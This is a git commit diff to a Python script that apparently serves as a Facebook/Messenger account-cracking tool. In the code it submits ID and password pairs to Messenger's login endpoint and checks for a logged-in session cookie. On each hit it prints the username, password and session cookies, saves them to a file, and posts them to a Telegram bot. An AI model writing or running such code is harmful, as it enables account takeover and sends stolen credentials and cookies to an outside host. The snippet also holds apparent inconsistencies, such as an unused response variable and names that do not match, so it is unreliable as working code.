47ec0f181e9caf31de9cf8269a6a9f9ae6c201eb
tessterr <168154763+tessterr@users.noreply.github.com>
2024-06-30 10:56:07 +0530

    Update test1.py

--- test1.py
+++ test1.py
@@ -1304,9 +1304,9 @@ def m5(idf,pwv):
     'DNT': '1',
     'Pragma': 'no-cache',
     'TE': 'Trailers', }#'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36',}
-   response = session.post('https://www.messenger.com/login/password/',data=log_data,headers=header_freefb).text
+   lo = session.post('https://www.messenger.com/login/password/',data=log_data,headers=header_freefb).text
    log_cookies=session.cookies.get_dict().keys()
-   if 'Logout' in response.text:
+   if 'c_user' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
     user = re.findall('c_user=(.*);xs', coki)[0]
     url = f"https://graph.facebook.com/{user}/picture?type=normal"
@@ -1314,11 +1314,11 @@ def m5(idf,pwv):
     if 'Photoshop' in reqx:
             print(f'\r\r{P}[ATOM-OK]: {user} | {ps}')
             print(f"\r\033[38;5;196mCOOKIES=[🤖]: {coki} \33[1;36m")
+            print(cek_apk(session, coki))
             open('/sdcard/ATOM-M6-live-OK.txt','a').write(user+'|'+ps+'|'+coki+'\n')
             statusok = (f" {user} | {ps} | {coki} ")
             requests.post(f"https://api.telegram.org/bot"+str(token)+"/sendMessage?chat_id="+str(ID)+"&text="+str(statusok))
             ok+=1
-            cek_apk(session, coki)
             break
    elif 'checkpoint' in log_cookies:
     coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
